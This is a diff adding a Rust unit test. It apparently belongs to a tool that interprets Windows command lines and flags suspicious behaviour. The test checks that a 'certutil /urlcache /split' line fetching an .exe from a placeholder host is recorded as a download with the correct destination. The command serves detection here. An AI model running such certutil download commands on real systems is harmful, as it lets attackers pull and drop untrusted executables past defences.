@@ -6722,6 +6722,27 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_urlcache_skips_slash_option_after_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certutil /urlcache /split http://x/slash-after.exe /f slash-after.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://x/slash-after.exe" && dst == "slash-after.exe"
+            )
+        });
+        assert!(
+            has,
+            "slash option after URL was treated as destination: {:?}",
+            env.traits
+        );
+        assert!(env.modified_filesystem.contains_key("slash-after.exe"));
+    }
+
+    #[test]
     fn certutil_decode_unresolved_src_still_emits_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line("certutil -decode missing.b64 dst.bin", &mut env);
